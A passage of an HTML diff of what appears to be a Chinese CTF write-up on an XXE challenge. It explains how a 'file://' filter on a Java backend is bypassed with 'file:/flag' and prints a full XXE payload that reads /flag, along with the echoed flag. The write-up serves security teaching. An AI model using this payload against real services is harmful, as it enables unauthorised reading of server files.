+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>类型      application/xml
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>请求体    输入框 #x 里的全部内容，原样提交
 </span></code></pre></div>
 <p><strong>也就是说：输入框里写什么 XML，服务器就拿什么去解析。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-2">Step 2：先确认后端语言（这一步很重要）</a></h4>
 <p><strong>我第一反应是 PHP 环境，于是去试 <code>php://filter</code>。</strong></p>
 <p><strong>结果报错里的堆栈信息显示是</strong>Java<strong>。</strong></p>
 <p><strong>这一步的价值：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>报错暴露语言 → 决定用哪套绕过思路
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>PHP  的伪协议        php://filter、php://input
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>报错暴露语言 → 决定用哪套绕过思路
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>PHP  的伪协议        php://filter、php://input
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设
 </span></code></pre></div>
 <p><strong>很多时候“过滤能不能绕”不取决于过滤写得严不严，而取决于</strong>解析器是谁<strong>。</strong></p>
 <h4 id="step-3file-java"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-3file-java">Step 3：<code>file://</code> 被过滤，但 Java 不认这个死理</a></h4>
 <p><strong>直接写 <code>file:///flag</code>，被拦了——代码里过滤了 <code>file://</code> 这个字符串。</strong></p>
 <p><strong>但 Java 的 XML 解析器在解析 <code>SYSTEM</code> 后面的值时，是按 <strong>URI</strong> 处理的，对斜杠数量并不敏感：</strong></p>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>SYSTEM<span class="w"> </span>"file:///flag"<span class="w">    </span>←<span class="w"> </span>被过滤
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>SYSTEM<span class="w"> </span>"file:/flag"<span class="w">      </span>←<span class="w"> </span>只有一个斜杠，能过
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>SYSTEM<span class="w"> </span>"/flag"<span class="w">           </span>←<span class="w"> </span>干脆不带协议，也能过（当作绝对路径）
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>SYSTEM<span class="w"> </span>"file:///flag"<span class="w">    </span>←<span class="w"> </span>被过滤
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>SYSTEM<span class="w"> </span>"file:/flag"<span class="w">      </span>←<span class="w"> </span>只有一个斜杠，能过
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>SYSTEM<span class="w"> </span>"/flag"<span class="w">           </span>←<span class="w"> </span>干脆不带协议，也能过（当作绝对路径）
 </span></code></pre></div>
 <p><strong>所以这里不是“绕过过滤技巧”，是“过滤器假设错了写法”。</strong>它以为外部实体只有 <code>file://</code> 一种形态。</p>
 <h4 id="step-4-payload"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-4-payload">Step 4：写 payload</a></h4>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="nt">&lt;诗筏&gt;</span>
-</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
-</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="nt">&lt;/诗筏&gt;</span>
 </span></code></pre></div>
 <p><strong>三部分缺一不可：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>① &lt;!DOCTYPE ... [ &lt;!ENTITY x SYSTEM "file:/flag"&gt; ]&gt;
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>   在 DTD 里声明一个实体 x，内容来自 file:/flag
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>② &lt;题名&gt;&amp;x;&lt;/题名&gt;
-</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>   在正文里**引用**它 —— 不引用，解析器根本不会去读文件
-</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
-</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>③ 保留原有的结构
-</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>① &lt;!DOCTYPE ... [ &lt;!ENTITY x SYSTEM "file:/flag"&gt; ]&gt;
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>   在 DTD 里声明一个实体 x，内容来自 file:/flag
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>② &lt;题名&gt;&amp;x;&lt;/题名&gt;
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>   在正文里**引用**它 —— 不引用，解析器根本不会去读文件
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>③ 保留原有的结构
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显
 </span></code></pre></div>
 <p><strong>最容易漏的是第 ②：</strong>只声明实体、不引用，服务器什么都不会给你。**</p>
 <h4 id="step-5"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-5">Step 5：提交，读结果</a></h4>
 <p><strong>把整段 XML 填进输入框，点提交。</strong></p>
 <p><strong>“誊抄入册”那块原样回显了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>落款：
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>出浴太真冰作影
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>捧心西子玉为魂
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>落款：
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>出浴太真冰作影
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>捧心西子玉为魂
 </span></code></pre></div>
 <p><strong>因为 <code>&amp;x;</code> 在解析时被替换成了 <code>/flag</code> 文件的内容。</strong></p>
 <hr />
@@ -5177,14 +5401,14 @@
 <hr />
 <details class="note">
 <summary>完整 payload</summary>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="nt">&lt;诗筏&gt;</span>
-</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
-</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
-</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="nt">&lt;/诗筏&gt;</span>
 </span></code></pre></div>
 </details>
 <details class="note">
